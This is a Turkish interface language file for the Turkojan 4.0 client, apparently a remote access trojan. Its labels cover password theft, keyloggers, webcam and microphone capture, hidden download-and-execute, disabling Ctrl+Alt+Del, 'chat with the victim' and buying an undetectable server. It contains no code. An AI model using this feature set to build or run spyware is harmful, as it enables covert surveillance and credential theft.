[General]
Program=Turkojan Language File
Author=Kırmızı
[CUSTOM]
lng0=şifreler
lng1=server şifreleri
lng2=erişebilirlik
lng3=uzaktan yönetim
lng4=webcam görüntüsü
lng5=ses alma
lng6=çeşitli ayarlar
lng7=clipboard ayarı
lng8=explorer ayarları
lng9=uygulama ayarları
lng10=uygulamalar
lng11=servisler
lng12=registry editor
lng13=fare ayarları
lng14=çözünürlük
lng15=klavye ayarları
lng16=klavye ayarları
lng17=online keylogger
lng18=offline keylogger
lng19=extra
lng20=online msn logları
lng21=offline msn logları
lng22=iletişim
lng23=serverla chat yap
lng24=server'a msj yolla
lng25=dosya yönetimi
lng26=dosya yöneticisi
lng27=dosya arama
lng28=siteden yükleme
lng29=komutlar
lng30=ms-dos
lng31=site yasakla
lng32=server ayarları
lng33=server ayarları
lng34=sistem bilgisi
lng35=sistem bilgisini al
lng36=kurulu programlar
lng37=eğlence
lng38=eğlence menüsü
lng39=extra eğlence
lng40=bize ulaşın
lng41=tanınmaz server
lng42=web-site
lng43=mail yollayın
lng44=hakkında
lng45=yerel araçlar
lng46=port test edici
lng47=server editor
lng48=ayarlar
lng49=Download edilecek dosyayı seçin !
lng50=Lütfen kullanicı ismini girin!
lng51=Lütfen DNS/Ip adresi'ni girin!
lng52=Lütfen doğru bir port numarası girin!
lng53=Lütfen ne kadar saniyede bir bağlantı kurulacağını belirtin!
lng54=Download edilecek dosyayı seçin !
lng55=Silinecek dosyayı seçin !
lng56=Seçili dosyayı silmek istediğinizden emin misiniz?
lng57=Çalıştırılacak dosyayı seçin !
lng58=Ziplenecek dosyayı seçin !
lng59=Lütfen ziplenecek klasöre gelin !
lng60=Bu işlemi gercekleştirebilmek için plugin yüklemelisiniz,plugin yüklensin mi?
lng61=Mail yollandı! Yolladiğiniz maile en kısa zamanda yanıt verilecektir.Teşekkürler...
lng62=Mail yollanırken hata oluştu! Lütfen daha sonra tekrar deneyin!
lng63=Lütfen bir isim girin!
lng64=Lütfen mail adresinizi girin!
lng65=Lütfen mail konusunu girin!
lng66=Lütfen mail adresinizi doğru girin!
lng67=Lütfen boş mail göndermeyin!
lng68=Maili kime yollayacaksınız?
lng69=Server'i kapatmak istediğinizden emin misiniz?
lng70=Server'i kaldırmak istediğinizden eminmisiniz?
lng71=Bulunduğunuz klasor içindeki tüm dosyaları silmek istediğinizden emin misiniz?
lng72=Bağlantı yok!
lng73=Lütfen bir uygulama seçin!
lng74=Hata
lng75=Lütfen bir çözünürlük seçin!
lng76=Kendinizi tanıtmak için bir nick yazın!
lng77=Kullanıcıyı tanımlamak için bir nick yazın!
lng78=Doğru ekran boyutu girin!Bu sayı 15 ile 100 arasında olmalı!
lng79=Bütün boşlukları doldurun!!
lng80=Gerçekten bu değeri silmek istiyor musunuz?
lng81=Silmeyi onayla
lng82=Lütfen doğru bir sayı girin!
lng83=Doğru bir dosya adı girin!
lng84=Lütfen kullanıcı için bir isim girin!
lng85=Mesaj gösterilmesini istiyorsanız gerekli yerleri doldurun!
lng86=Doğru bir registry anahtar adı girin!
lng87=Doğru dosya adını girin!
lng88=Lütfen kullanıcının size bağlanmasını sağlayacak olan DNS/Ip adresini yazın!
lng89=Lütfen ne kadar saniyede bir bağlantı kurulacağını belirtin!
lng90=Doğru bir port girin! Port '1 ile 65535' arasında bir sayı olmalı!
lng91=Lütfen doğru bir simge seçin!
lng92=Bazı ayarlar kaydedilemedi!
lng93=Server oluşturulamadı!
lng94=Simge değistirilemedi!
lng95=Lütfen açılan pencereden bir uygulama seçin!
lng96=Seçtiğiniz uygulamanın simgesi program dizinine kopyalanacaktır!
lng97=Bilgi
lng98=Seçtiğiniz uygulama içindeki simgeler program klasörüne kopyalandı!
lng99=Lütfen bir servis seçin!
lng100=Lütfen bir uygulama seçin!
lng101=Lütfen görüntü almak istediginiz Webcam'i seçin!
lng102=Lutfen download ettirilecek olan dosyanın adresini girin!
lng103=Download ettirilecek olan dosyanın adresi 'http://' yada 'ftp://' ile başlamalıdır!
lng104=Lutfen dosyanın karşı bilgisayara hangi isimle download edileceğini belirtin!!
lng105=Lutfen dosyanın karşı bilgisayarda hangi dizine download edileceğini belirtin!!
lng106=Lütfen kaldırılacak siteyi seçin!
lng107=Lütfen wav dosyası seçin!
lng108=Offline
lng109= nick'li 
lng110= ip adresli kullanıcı offline oldu.
lng111= ip adresli kullanıcı online oldu.
lng112=Bağlantı yok!
lng113=Hazır
lng114=      Deaktif
lng115=Sistem'i deaktif et
lng116=Aktif
lng117=Sistem'i aktif et
lng118=Deaktif
lng119=      Aktif
lng120=Bağlantı koptu!
lng121=Plugin yüklendi
lng122=Resimler görüntülendi
lng123=Uzak masaüstü baglantısı sona erdi
lng124=Webcam bağlantısı sona erdi
lng125=Ses iletişimi durdu
lng126=Log alımı durdu
lng127=Bağlantı koptu!
lng128=Online keylogger açıldı
lng129=Online keylogger kapatıldı
lng130=Webcam yok
lng131=Webcam baglantısı yapılamıyor,webcam meşgul olabilir
lng132=Webcam listesi alındı
lng133=şifreler alınamadı
lng134=Plugin dosyası yükleme listesine eklendi
lng135=Bekliyor
lng136=Dosya başarıyla download edilip çalıştırıldı
lng137=Dosya başarıyla download edildi
lng138=Dosya download edilemedi
lng139=Servis listesi alındı
lng140=Registry yenilendi
lng141=Loglar alındı
lng142=Dosya bulundu
lng143=şifreler Alındı
lng144=Server kapatıldı
lng145=Server ayarları alındı
lng146=Servis kaldırıldı
lng147=Servis durduruldu
lng148=Servis başlatıldı
lng149=Server ayarları kaydedildi
lng150=Kullanıcı Cevabi : 
lng151=Bilgisayar kapatıldı
lng152=Bilgisayar yeniden başlatıldı
lng153=Windows oturumu kapatıldı
lng154=Sonsuz sayida hata mesajı gösterildi
lng155=Ekran dikey olarak çevrildi
lng156=Ekran yatay olarak çevrildi
lng157=Saat gizlendi
lng158=Saat gösterildi
lng159=Monitör açıldi
lng160=Monitör kapatıldı
lng161=CD-Rom açıldı
lng162=CD-Rom kapatıldı
lng163=Taskbar kilitlendi
lng164=Taskbar kilidi kaldırıldı
lng165=Taskbar gizlendi
lng166=Taskbar gösterildi
lng167=Masaüstü gizlendi
lng168=Masaüstü gösterildi
lng169=Masaüstü kilitlendi
lng170=Masaüstü kilidi kaldırıldı
lng171=Başlat tuşu gizlendi
lng172=Başlat tuşu gösterildi
lng173=Başlat tuşu kilitlendi
lng174=Başlat tuşu'nun kilidi kaldırıldı
lng175=Task simgeleri gizlendi
lng176=Task simgeleri gösterildi
lng177=Klavye ışıkları kapatıldı
lng178=Klavye ışıkları açıldı
lng179=Ctrl+Alt+Del kullanılamaz hale getirildi
lng180=Ctrl+Alt+Del kullanılabilir hale getirildi
lng181=Alt+Tab kullanılamaz hale getirildi
lng182=Alt+Tab kullanılabilir hale getirildi
lng183=Num-Lock durumu değiştirildi
lng184=Caps-Lock durumu değiştirildi
lng185=Scroll-Lock durumu değiştirildi
lng186=Klavye kilitlendi
lng187=Klavye kilidi kaldırıldı
lng188=Çözünürlük değiştirildi
lng189=Uygulama gösterildi
lng190=Uygulama penceresi parlatıldı
lng191=Uygulama kapatıldı
lng192=Uygulama gizlendi
lng193=Uygulama'nin kapat tuşu yok edildi
lng194=Uygulama aktif hale getirildi
lng195=Uygulama kilitlendi[deaktif]
lng196=Uygulama tam ekran olarak gösterildi
lng197=Uygulama simge durumuna küçültüldü
lng198=Web sayfası açıldı
lng199=Giriş sayfası değiştirildi
lng200=Fare deliriyor..
lng201=Fare tuşlari değiştirildi
lng202=Fare tuşlari düzeltildi
lng203=Fare kilitlendi
lng204=Ses iletişimi durduruldu
lng205=Kullanıcı ile konuşma başlatıldı
lng206=Kullanıcı dinleniliyor...
lng207=Fare kilidi kapatıldı
lng208=Fare zipliyor..
lng209=Fare durdu
lng210=Clipboard metni ayarlandı
lng211=Clipboard kilitlendi
lng212=Clipboard kilidi açıldı
lng213=Tarih ayarlandı
lng214=Tarih ayarlanamadı
lng215=Saat ayarlandı
lng216=Saat ayarlanamadı
lng217=Clipboard metni ayarlandı
lng218=Fare kuyruğu ayarlandı
lng219=Fare çift tıklama hizi ayarlandı
lng220=Fare delirtme işlemi durduruldu
lng221=Uygulama başlığı değiştirildi
lng222=Baglanılan bilgisayar :
lng223=Webcam bulunamadi
lng224=Diğer şifreler alındı...
lng225=Uygulama listesi alındı
lng226=Çalışan uygulamalar öğrenildi
lng227=Ziyaret edilen sayfalar öğrenildi
lng228=Fare çift tiklama hızı öğrenildi
lng229=Sistem bilgileri alındı
lng230=Clipboard metni öğrenildi
lng231=Uygun çözünürlükler alındı
lng232=Erişimi yasaklanan siteler öğrenildi
lng233=Yapılan değisiklikler kaydedildi
lng234=Online msn takibi durduruldu
lng235=Online msn başlatıldı
lng236=Chat ekranı kapatıldı
lng237=Chat ekranı açıldı
lng238=Klasör oluşturuldu
lng239=Dosya ismi değiştirildi
lng240=Dosya silindi
lng241=Dosya silinemedi
lng242=Dosya ziplendi!
lng243=Dosya ziplenemedi!
lng244=Klasör ziplendi!
lng245=Dosyalar ziplenemedi!
lng246=Kurulu programlar öğrenildi
lng247=Klasör silindi
lng248=Klasör silinemedi
lng249=Diğer şifreler alındı
lng250=Uzak masaüstü bağlantısı yapıldı..
lng251=Webcam baglantısı yapıldı..
lng252=Ses iletişimi saglandı..
lng253= nick'li kullanıcı internete girdi.
lng254=[ Aktif PC : 
lng255=[Online : 
lng256=Uygulama başlığı değiştiriliyor...
lng257=Çalişan uygulamalar öğreniliyor...
lng258=Uygulama kapatılıyor...
lng259=Uygulama gösteriliyor...
lng260=Uygulama gizleniyor...
lng261=Kapat tuşu gizleniyor...
lng262=Uygulama penceresi parlatılıyor...
lng263=Uygulama tam ekran yapılıyor..
lng264=Uygulama simge durumuna küçültülüyor..
lng265=Uygulama aktif hale getiriliyor...
lng266=Uygulama kilitleniyor..
lng267=Uygun çözünürlükler alınıyor..
lng268=Çözünürlük değiştiriliyor...
lng269=Chat yapmaya başlanılıyor...
lng270=Hata mesaj'i yollandı
lng271=Online keylogger açılıyor...
lng272=Online keylogger kapatılıyor...
lng273=Sistem bilgisi alınıyor...
lng274=Masaüstü gizleniyor...
lng275=Masaüstü gösteriliyor...
lng276=Masaüstü kilitleniyor...
lng277=Masaüstü kilidi kaldırılıyor...
lng278=Başlat tuşu gizleniyor...
lng279=Başlat tuşu gösteriliyor...
lng280=Başlat tuşu kilitleniyor...
lng281=Başlat tuşu'nun kilidi kaldırılıyor...
lng282=Task simgeleri gizleniyor...
lng283=Task simgeleri gösteriliyor...
lng284=Saat gizleniyor...
lng285=Saat gösteriliyor...
lng286=Monitör açılıyor...
lng287=Monitör kapatılıyor...
lng288=CD-Rom açılıyor...
lng289=CD-Rom kapatılıyor...
lng290=Taskbar kilitleniyor...
lng291=Taskbar kilidi kaldırılıyor...
lng292=Taskbar gizleniyor...
lng293=Taskbar gösteriliyor...
lng294=Dosyalar bulunuyor...
lng295=Clipboard metni alınıyor...
lng296=Clipboard metni ayarlaniyor...
lng297=Clipboard boşaltılıyor...
lng298=Clipboard kilitleniyor
lng299=Clipboard kilidi kaldırılıyor...
lng300=Chat ekrani kapatılıyor..
lng301=Ctrl+Alt+Del kullanilmaz hale getiriliyor
lng302=Ctrl+Alt+Del eski haline getiriliyor
lng303=Alt+Tab kullanılmaz hale getiriliyor
lng304=Alt+Tab eski haline getiriliyor
lng305=Num-Lock kapatılıyor...
lng306=Num-Lock açılıyor...
lng307=Caps-Lock kapatılıyor...
lng308=Caps-Lock açılıyor...
lng309=Scroll-Lock kapatılıyor...
lng310=Scroll-Lock açılıyor...
lng311=Klavye kilitleniyor...
lng312=Klavye kilidi kaldırılıyor...
lng313=Klavye ışıkları kapatılıyor...
lng314=Klavye ışıkları açılıyor...
lng315=Server ayarları alınıyor...
lng316=Server ayarları değiştiriliyor...
lng317=Server kapatılıyor...
lng318=Server kaldırılıyor...
lng319=Instant Messenger şifreleri Alınıyor..
lng320=E-Posta şifreleri Alınıyor..
lng321=Dialer şifreler Alınıyor..
lng322=Browser şifreler Alınıyor..
lng323=FTP şifreleri Alınıyor..
lng324=Downloader şifreler Alınıyor..
lng325=Diger şifreler Alınıyor..
lng326=Bilgisayar kapatılıyor...
lng327=Bilgisayar yeniden başlatılıyor...
lng328=Oturum kapatılıyor...
lng329=Ekran dikey olarak çevriliyor...
lng330=Ekran yatay olarak çevriliyor...
lng331=Sonsuz sayida hata mesaji yollaniyor...
lng332=Fare delirtiliyor...
lng333=Fare delirtme işlemi durduruluyor...
lng334=Fare tuşlarıi değiştiriliyor...
lng335=Fare tuşları düzeltiliyor...
lng336=Fare kilidi açılıyor...
lng337=Fare kilidi kapatılıyor...
lng338=Fare zıplatılıyor...
lng339=Fare durduruluyor...
lng340=Fare Çift Tıklama hızı öğreniliyor...
lng341=Fare Çift Tıklama hızı ayarlanıyor...
lng342=Fare Kuyruğu ayarlanıyor...
lng343=Fare kontrol ediliyor : 
lng344=Plugin yükleniyor..
lng345=Loglar alınıyor...
lng346=Web sayfası açılıyor...
lng347=Giriş sayfası değiştiriliyor...
lng348=Ziyaret edilen sayfalar öğreniliyor...
lng349=Servis listesi alınıyor...
lng350=Servis kaldırılıyor...
lng351=Servis durduruluyor...
lng352=Servis başlatılıyor...
lng353=Uygulama listesi yenileniyor...
lng354=Uygulama sonlandırılıyor...
lng355=Kurulu programlar öğreniliyor..
lng356=Uzak masaüstü bağlantısı yapılıyor..
lng357=Görüntü alınıyor..
lng358=Webcam bağlantısı yapılıyor...
lng359=Webcam listesi alınıyor...
lng360=Ses iletişimi durduruluyor...
lng361=Ses iletisimi sağlanıyor...
lng362=Dosya download ettiriliyor..
lng363=Loglar alınıyor...
lng364=Online msn takibi başlatılıyor...
lng365=Online msn takibi durduruldu
lng366=Erişimi yasaklanan siteler öğreniliyor..
lng367=Yapilan değişiklikler kaydediliyor..
lng368= Test ediliyor...
lng369= Port açık
lng370= Port kapalı
lng371= - Titreşim gönderdiniz
lng372=Bekliyor
lng373=    Test Ediliyor...
lng374=Ayarlar kaydedildi ve server oluşturuldu!
lng375=Işletim Sistemi
lng376=Admin Mi
lng377=Açık Süre
lng378=Meşgul Süre
lng379=Bilgisayar Adı
lng380=Kullanıcı Adı
lng381=işlemci Modeli
lng382=işlemci Adı
lng383=Windows Dili
lng384=Cözünürlük
lng385=Num-lock
lng386=Caps-lock
lng387=Scroll-lock
lng388=Tarayıcı
lng389=Antivirus
lng390=Firewall
lng391=Mac Adresi
lng392=Windows Dizini
lng393=Sistem Dizini
lng394=Temp Dizini
lng395=Direct-x Sürümü
lng396=Boş Alan
lng397=Clipboard boş yada yazı formatında değil
lng398=Clipboard metni dğişti : 
lng399=Tarih / Saat 
lng400=Server'i Kapat
lng401=Gönder
lng402=Serveri kapatmak istediginizden emin misiniz?
lng403=Uyari
lng404=yeni değer
lng405=değer''in adı
lng406=Site Erişimini Yasakla
lng407=Yasaklanacak Site :
lng408=Durdur
lng409=Başlat
lng410=Kontrolü durdur
lng411=Kontrol et
lng412=CTRL+ALT+DEL kombinasyonu gonder
lng413=Görüntü kalitesini değistir
lng414=Tam ekran / Normal ekran
lng415=Resmi kaydet
lng416=Uzaktan Yonetim
lng417=Tamam
lng418=Ýptal
lng419=Durdur
lng420=Yeniden Dene
lng421=Yoksay
lng422=Evet
lng423=Hayýr
lng424=Bilinmiyor
lng425=Açýk
lng426=Kapalý
lng427=Dosya baþarýyla çalýþtýrýldý
lng428=Dosya çalýþtýrýlamadý
lng429=Uygulama kapatýlamadý
lng430=Uygulama kapatýldý
[frmMain]
fltttlFlatTitlebar1=Turkojan Client v4.0
tlabelLabel7=[Online : 0 ]
tflbtnbtnClose=X
fbthntbtnClose=Kapat
tflbtnbtnMinimize=_
fbthntbtnMinimize=Simge Durumuna Küçült
tlviewSinSrvs0=Baglantı adı :
tlviewSinSrvs1=IP Adresi :
tlviewSinSrvs2=Bilgisayar Adı :
tlviewSinSrvs3=Sistem :
tlabelLabel3=Hazır
tlabelLabel5=Durum :
tlabelLabel6=Deaktif
tlabelLabel1=Port : 
fltpnlFlatPanel13=||||||Aktif
flthntFlatPanel13=Sistem'i aktif et
imghntImage3=Sistem'i aktif et
fltpnlFlatPanel14=|||||Hakkında
flthntFlatPanel14=Program Hakkında
imghntImage6=Program Hakkında
fltpnlFlatPanel16=||||||Editör
flthntFlatPanel16=Server Editör
imghntImage7=Server Editör
fltpnlFlatPanel17=||||||Satın|Al
flthntFlatPanel17=Satın Al
imghntImage9=Tanınmayan server almak için buraya tıklayın!
fltpnlFlatPanel18=||||||Ayarlar
flthntFlatPanel18=Ayarlar
imghntImage10=Server Editör
tmitemGster1=Göster
tmitemN1=-
tmitemKapat1=Çıkış
[frmManager]
fltpnlFlatPanel4=Hazır
tlviewlvdirs0=Klasörün Adı
tlviewlvfiles0=Dosya Adı
tlviewlvfiles1=Boyut
tlviewlvfiles2=Öznitelikler
tlviewListView10=Sürücüler
fbthntbtnrefresh=Sürücüleri Al
fbthntbtnwave=Müzik Çal
fbthntbtnrefres=Yenile
fbthntbtndownload=Download Et
fbthntbtnrename=Yeniden Adlandır
fbthntbtndelete=Dosyayı Sil
fbthntbtnexecuteh=Gizlice Çalıştır
fbthntbtnexecuten=Gizlice Çalıştır
fbthntbtnupload=Upload Et
fbthntbtnziple=Dosyayi Ziple
fbthntFlatButton1=Klasörü ve içindekileri Sil
fbthntFlatButton2=Duvarkağıdı Yap
fbthntFlatButton3=Normal Çalıştır
fbthntFlatButton4=Masaüstüne Git
fbthntFlatButton5=Belgelerim Klasörüne Git
fbthntFlatButton6=Programlar Klasörüne Git
fbthntFlatButton7=Sistem Klasörüne Git
fbthntFlatButton8=Windows Klasörüne Git
fbthntFlatButton9=Başlangıç Klasörüne Git
fbthntFlatButton10=Yeni Klasör Oluştur
fbthntFlatButton11=Kullanıcı klasorune git
fbthntFlatButton12=Metni Oku
fltttlFlatTitlebar1=Dosya Yöneticisi
tflbtnbtnClose=X
fbthntbtnClose=Kapat
fbthntFlatButton13=Klasörü Ziple
fbthntbtnthumb=Resimleri Görüntüle
[frmAntlasma]
tlabelLabel1=Bu program tamamen eğitim amaçlı yapılmıştır,programı kullanarak yapabilecekleriniz TCK'nin 243. ve 244. madde hükümleri
tlabelLabel2=uyarınca suç teşkil edebilmektedir.Amaç dışında kullanırsanız sorumluluk size aittir ve programın yazarı sorumlu tutulamaz.
fltpnlFlatPanel5=|||||Kabul|Ediyorum
flthntFlatPanel5=Kabul Ediyorum
fltpnlFlatPanel7=||||||Kabul|Etmiyorum
flthntFlatPanel7= Kabul Etmiyorum
fltttlFlatTitlebar1=Kullanım şartlari
[frmTaskList]
tlviewLvwProcess0=Uygulama Başlığı
tlviewLvwProcess1=Program Kodu
fltpnlFlatPanel3=|||||Başlığı|Değiştir
flthntFlatPanel3=Seçili Uygulamanın Başlığını Değiştir
fltpnlFlatPanel4=||||Listeyi|Yenile
flthntFlatPanel4=Listeyi Yenile
fltchkFlatCheckBox1=Bütün Uygulamaları Göster
fltpnlFlatPanel5=|||||Programı|Kapat
flthntFlatPanel5=Seçili Uygulamayı Kapat
fltpnlFlatPanel6=|||||Programı|Göster
flthntFlatPanel6=Uygulamayı Göster
fltpnlFlatPanel7=||||Programı|Sakla
flthntFlatPanel7=Uygulamayı Gizle
fltpnlFlatPanel8=||||Programı|Parlat
flthntFlatPanel8=Seçli Uygulamayı Parlat
fltpnlFlatPanel9=||||||X|Tusunu|Sakla
flthntFlatPanel9=Kapat Tusunu Gizle
fltpnlFlatPanel10=||||Tam|Ekran|Yap
flthntFlatPanel10=Seçili Uygulamayı Tam Ekran Yap
fltpnlFlatPanel11=|||Simge|Durumu
flthntFlatPanel11=Seçili Uygulamayı Simge Durumuna Küçült
fltpnlFlatPanel12=Aktif|Et
flthntFlatPanel12=Seçili Uygulamayı Aktif Et
fltpnlFlatPanel13=Deaktif|Et
flthntFlatPanel13=Seçili Uygulamayı Deaktif Et
fltpnlFlatPanel14=Uygulama|Ayarları
[frmScreen]
tlviewLvwResolutions0=Uygun Çözünürlükler
fltpnlFlatPanel4=||||||Uygun|Çözünürlükleri|Al
flthntFlatPanel4=Uygun Çözünürlükleri Al
fltpnlFlatPanel6=||||Çözünürlüğü|Degiştir
flthntFlatPanel6=Çözünürlüğü Değiştir
fltpnlFlatPanel12=Ekran|Çözünürlüğünü|Ayarla
[frmOpenChat]
tflboxFlatGroupBox1=Chat Özellikleri
tlabelLabel5=Kullanıcı Nicki [sizin] :
tlabelLabel6=Kullanıcı Nicki [karşı tarafın] :
tflboxFlatGroupBox2=Diğer Özellikler
tlabelLabel7=Chat Ekranının Boyutu :
tlabelLabel8=Ekranın % 
tlabelLabel9=kadar olan kısmını kapla
fltpnlFlatPanel10=|||||Chat|Yapmaya|Başla
flthntFlatPanel10=Kurbanla Chat Yapmaya Başla
fltpnlFlatPanel4=||||||Varsayılan|Ayarlar'a|Dön
flthntFlatPanel4=Varsayılan Ayarlar'a geri Dön
fltpnlFlatPanel12=Chat|Yap
[frmMsgBox]
tlabelLabel1=Mesaj Başlığı :
tlabelLabel2=Mesaj Metni :
tlabelLabel3=Satir atlamak için '|' karekterini kullanabilirsiniz
tflboxFlatGroupBox1=Mesaj Simgesi
tflbtnFlatButton1=[YOK]
tflboxFlatGroupBox2=Mesaj Tuşlari
fltrbtFlatRadioButton1=OK
fltrbtFlatRadioButton2=OK,Cancel
fltrbtFlatRadioButton3=Yes,No
fltrbtFlatRadioButton4=Yes,No,Cancel
fltrbtFlatRadioButton5=Retry,Cancel
fltrbtFlatRadioButton6=Abort,Retry,Ignore
fltpnlFlatPanel10=||||Mesajı|Test|Et
flthntFlatPanel10=Mesajı Test Et
fltpnlFlatPanel4=|||Mesaji|Yolla
flthntFlatPanel4=Mesajı Yolla
fltpnlFlatPanel3=!
flthntFlatPanel3=Hazır Mesajlar
fltpnlFlatPanel12=Sahte|Hata|Mesajı|Gönder
[frmLogger]
fltpnlFlatPanel5=||Aktif
flthntFlatPanel5=Keylogger'i Aç
fltpnlFlatPanel6=||||Deaktif
flthntFlatPanel6=Keylogger'i Kapat
fltpnlFlatPanel7=||||Temizle
flthntFlatPanel7=Temizle
fltpnlFlatPanel1=|||||Kaydet
flthntFlatPanel1=Bilgileri Kaydet
fltpnlFlatPanel18=Online|Keylogger
[frmInformation]
fltpnlFlatPanel5=|||||Sistem|Bilgisini|Al
flthntFlatPanel5=Sistem Bilgisini Al
fltpnlFlatPanel7=||||Temizle
flthntFlatPanel7=Temizle
fltpnlFlatPanel3=|||||Kaydet
flthntFlatPanel3=Bilgileri Kaydet
tlviewListViewInformacion0=Açıklama
tlviewListViewInformacion1=Bilgi
fltpnlFlatPanel18=Sistem|Bilgisi
[frmFun]
tflboxFlatGroupBox1=Masaüstü
fltpnlFlatPanel7=|||Gizle
flthntFlatPanel7=Masaüstü'nü Gizle
fltpnlFlatPanel3=|||||Göster
flthntFlatPanel3=Masaüstü'nü Göster
tflboxFlatGroupBox2=Masaüstü
fltpnlFlatPanel4=|||Kilitli
flthntFlatPanel4=Masaüstü'nü Kitle
fltpnlFlatPanel5=||||Açık
flthntFlatPanel5=Masaüstü Kilidini Kaldır
tflboxFlatGroupBox3=Başlat Tuşu
fltpnlFlatPanel6=|||Gizle
flthntFlatPanel6=Başlat Tuşu'nu Gizle
fltpnlFlatPanel8=|||||Göster
flthntFlatPanel8=Başlat Tuşu'nu Göster
tflboxFlatGroupBox4=Taskbar
fltpnlFlatPanel9=|||Gizle
flthntFlatPanel9=Taskbar'i Gizle
fltpnlFlatPanel10=|||||Göster
flthntFlatPanel10=Taskbar'i Göster
tflboxFlatGroupBox5=Task Simgeleri
fltpnlFlatPanel11=|||Gizle
flthntFlatPanel11=Task Simgeleri'ni Gizle
fltpnlFlatPanel12=|||||Göster
flthntFlatPanel12=Task Simgeleri'ni Göster
tflboxFlatGroupBox6=Saat
fltpnlFlatPanel13=|||||Göster
flthntFlatPanel13=Saat'i Göster
fltpnlFlatPanel14=|||Gizle
flthntFlatPanel14=Saat'i Gizle
tflboxFlatGroupBox7=Monitor
fltpnlFlatPanel15=|||Açık
flthntFlatPanel15=Monitör'ü Aç
fltpnlFlatPanel16=||||Kapalı
flthntFlatPanel16=Monitör'ü Kapat
tflboxFlatGroupBox8=CD-Rom
fltpnlFlatPanel17=|||Açık
flthntFlatPanel17=CD-Rom'u Aç
fltpnlFlatPanel18=||||Kapalı
flthntFlatPanel18=CD-Rom'u Kapat
tflboxFlatGroupBox9=Taskbar
fltpnlFlatPanel19=|||Kilitli
flthntFlatPanel19=Taskbar'i Kilitle
fltpnlFlatPanel20=||||Açık
flthntFlatPanel20=Taskbar Kilidini Kaldır
tflboxFlatGroupBox10=Başlat Tuşu
fltpnlFlatPanel21=|||Kilitli
flthntFlatPanel21=Başlat Tuşu'nu Kitle
fltpnlFlatPanel22=||||Açık
flthntFlatPanel22=Başlat Tuşu Kilidini Kaldır
fltpnlFlatPanel23=Eğlence|Menüsü
[frmFind]
tflboxFlatGroupBox1=Arama Kriterleri
tlabelLabel1=Aranan Dosya :
tlabelLabel2=Dosya'nin Konumu :
fltpnlFlatPanel5=|||||Dosya'yı|Bul
flthntFlatPanel5=Dosyaları Bul
fltpnlFlatPanel3=|||||Listeyi|Temizle
flthntFlatPanel3=Listeyi Temizle
tlviewlvdirs0=Dosya
tlviewlvdirs1=Nerede
tlviewlvdirs2=Boyut
fltpnlFlatPanel4=|||||Download|Et
flthntFlatPanel4=Download Et
fltpnlFlatPanel12=Dosya|Ara
[frmClipboard]
tflboxFlatGroupBox1=Clipboard
fltpnlFlatPanel4=||||Metni|Oku
flthntFlatPanel4=Clipboard Metnini Oku
fltpnlFlatPanel3=|||Metni|Ayarla
flthntFlatPanel3=Clipboard Metnini Ayarla
fltpnlFlatPanel5=||||Metni|Temizle
flthntFlatPanel5=Clipboard'uTemizle
fltpnlFlatPanel6=Clipboard'u|Kilitle
flthntFlatPanel6=Clipboard'u Kilitle
fltpnlFlatPanel7=||||Clipboard|Kiliidi'ni|Kaldır
flthntFlatPanel7=Clipboard Kilidini Kaldır
fltpnlFlatPanel18=Clipboard|Metnini|Ayarla
[frmRemoteDownload]
fltttlFlatTitlebar1=Karşı Bilgisayara Siteden Dosya Yükleme
tflbtnbtnClose=X
fbthntbtnClose=Kapat
tflboxFlatGroupBox1=Dosya Ayarları 
tlabelLabel1=Adres : 
tlabelLabel2=Dosya Ismi :
tlabelLabel3=Dizin :
tflboxFlatGroupBox3=Yüklenecek Dizin 
fltrbtFlatRadioButton1=Appdata Dizini 
fltrbtFlatRadioButton2=Windows Dizini
fltrbtFlatRadioButton6=Sistem Dizini
fltrbtFlatRadioButton3=Temp Dizini
fltrbtFlatRadioButton5=Başka Dizin
fltrbtFlatRadioButton4=Başlangıç Dizini
fltchkFlatCheckBox1=Yükleme bittikten sonra yüklenen dosya otomatik olarak çalıştırılsın 
fltpnlFlatPanel6=|||Yüklemeyi|Test|Et
flthntFlatPanel6=Yüklemeyi Test Et
imghntImage5=Yüklemeyi Test Et
fltpnlFlatPanel3=||||Yüklemeye|Başla
flthntFlatPanel3=Yüklemeye Başla
imghntImage1=Yüklemeye Başla
[frmIMSniffOff]
fltpnlFlatPanel5=|Logları|Al
flthntFlatPanel5=Logları al
fltpnlFlatPanel7=||||Temizle
flthntFlatPanel7=Temizle
fltpnlFlatPanel1=|||||Kaydet
flthntFlatPanel1=Bilgileri Kaydet
fltpnlFlatPanel18=Offline|Msn|Logları
[frmIMSniffOn]
fltpnlFlatPanel5=||Aktif
flthntFlatPanel5=Keylogger'i Aç
fltpnlFlatPanel6=||||Deaktif
flthntFlatPanel6=Keylogger'i Kapat
fltpnlFlatPanel7=||||Temizle
flthntFlatPanel7=Temizle
fltpnlFlatPanel1=|||||Kaydet
flthntFlatPanel1=Bilgileri Kaydet
fltpnlFlatPanel18=Online|Msn|Logları
[frmBlockSite]
tlviewLvwResolutions0=Erişimi Yasaklanan Siteler
fltpnlFlatPanel4=|||||Listeyi|Al
flthntFlatPanel4=Erisimi Yasaklanan Siteleri Al
fltpnlFlatPanel6=||||Kaldır
flthntFlatPanel6=Secilen Adresi Listeden Kaldır
fltpnlFlatPanel3=||||||Kaydet
flthntFlatPanel3=Değişiklikleri Kaydet
fltpnlFlatPanel5=|||||Temizle
flthntFlatPanel5=Listeyi Temizle
fltpnlFlatPanel7=||||Ekle
flthntFlatPanel7=Yeni Site Ekle
fltpnlFlatPanel12=Site|Erişimini|Yasakla
[frmAyarlar]
tflboxFlatGroupBox1=Baglantı Ayarları 
tlabelLabel1=Müzik :
fltchkFlatCheckBox1=Kullanıcı internete girdiğinde beni bilgilendir
fltchkFlatCheckBox2=Kullanıcı internete girdiğinde müzik çalınsın
fltpnlFlatPanel4=!
flthntFlatPanel4=Müzik dosyasını seç
tflboxFlatGroupBox2=Bağlantı Geçmişi 
fltchkFlatCheckBox3=Bağlantı geçmişi sırasıyla kayıt altına alınsın
fltpnlFlatPanel3=||||||Ayarları|Kaydet
flthntFlatPanel3=Bilgileri Kaydet
fltpnlFlatPanel6=|||||Varsayılan|Ayarlar
flthntFlatPanel6=Varsayılan Değerleri Ata
fltttlFlatTitlebar1=Ayarlar
tflbtnbtnClose=X
fbthntbtnClose=Kapat
[frmTest]
fltttlFlatTitlebar1=Port Test Edici
tflbtnbtnClose=X
fbthntbtnClose=Kapat
tlabelLabel2=Port : 
fltpnlFlatPanel5=|||||Test|Et
flthntFlatPanel5=Test Et
fltpnlFlatPanel4=|Hazır
[frmSupport]
tlabelLabel8=Mail Kime Yollanacak :
tflboxFlatGroupBox1=Mail Ayarları
tlabelLabel5=isminiz :
tlabelLabel6=Mailiniz :
tlabelLabel7=Konu :
